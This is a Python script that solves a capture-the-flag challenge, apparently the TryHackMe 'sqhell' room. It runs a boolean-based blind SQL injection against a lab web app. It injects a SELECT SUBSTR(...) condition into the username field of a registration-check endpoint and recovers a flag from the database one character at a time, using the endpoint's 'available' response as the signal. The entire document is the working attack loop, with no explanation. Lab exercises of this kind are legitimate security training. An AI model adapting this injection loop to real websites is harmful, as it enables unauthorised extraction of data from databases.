import requests
import json
flagtemplate='THM{FLAG3:' 
ip='10.10.173.184' 
i=1
while i<=32:
    for j in range(48,71):
        if j in range(58,65): 
            pass
        else:
            payload="admin' AND (SELECT SUBSTR((SELECT flag from sqhell_3.flag),1,%s)='%s') AND '1'='1"%(10+i,flagtemplate+chr(j))
            data=requests.post(url="http://%s/register/user-check?username=%s"%(ip,payload)) 
            data=json.loads(data.text)
            if data["available"] == False:
                flagtemplate+=chr(j)
                print(flagtemplate)
                break
            if j==70:
                exit("Error: Couldn't find matching character!")
    i+=1    
print(flagtemplate+"}")
